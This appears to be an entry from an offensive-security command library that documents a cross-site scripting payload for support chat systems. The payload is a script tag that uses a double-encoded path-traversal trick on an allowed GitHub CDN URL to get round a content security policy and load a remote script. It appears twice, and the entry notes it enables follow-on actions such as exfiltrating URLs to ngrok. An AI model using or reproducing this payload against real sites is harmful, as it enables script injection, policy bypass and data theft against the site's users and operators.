---
data: >-
  <script type="text/javascript"
  src="https://raw.githack.com/mattboldt/typed.js/master/lib/typed.js/../..%252f..%252f..%252f..%252fAjay-Aj-00/Test/master/final.js"></script>
tags:
  - xss
  - csp-bypass
type: command
output: Loads and executes final.js from GitHub
executor: javascript
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T04:39:10.013Z'
id: 3bc179ef-5569-41ee-add5-37960083fb83
verified: false
validated: true
submitted: true
---
# inject-xss-payload-support-chat

## Command

```javascript
<script type="text/javascript" src="https://raw.githack.com/mattboldt/typed.js/master/lib/typed.js/../..%252f..%252f..%252f..%252fAjay-Aj-00/Test/master/final.js"></script>
```

## Description

Injects an XSS payload into support chat messages to bypass CSP by backtracking the allowed GitHub URL path, loading external malicious JS after a low rating triggers the review page.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| src | Backtracked URL to GitHub-hosted JS | Yes |

## Examples

### Basic Usage

```javascript
<script type="text/javascript" src="https://raw.githack.com/mattboldt/typed.js/master/lib/typed.js/../..%252f..%252f..%252f..%252fAjay-Aj-00/Test/master/final.js"></script>
```

### Advanced Usage

Customize the repo path for different hosted JS.

## Expected Output

External JS loads and executes, enabling further actions like URL exfiltration.

## Related

- [[commands/exfiltrate-url-to-ngrok]]
- [[procedures/CSP-Bypass-and-XSS-in-Support-Chat]]
